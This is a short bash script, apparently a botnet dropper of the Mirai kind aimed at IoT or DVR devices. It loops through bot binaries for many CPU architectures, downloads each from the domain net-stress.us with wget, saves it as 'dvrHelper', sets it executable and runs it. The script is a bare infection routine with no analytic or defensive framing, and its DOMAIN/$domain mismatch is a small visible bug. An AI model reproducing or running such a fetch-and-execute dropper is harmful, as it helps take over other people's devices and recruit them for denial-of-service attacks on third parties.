#!/bin/bash

DOMAIN='net-stress.us'
BINARYS='bot.arm bot.arm5n bot.arm7 bot.m68k bot.mips bot.mpsl bot.ppc bot.sh4 bot.spc bot.x86'

for bins in $BINARYS; do
	wget http://$domain/bins/$bins -O dvrHelper;
	chmod 777 dvrHelper;
	./dvrHelper
done
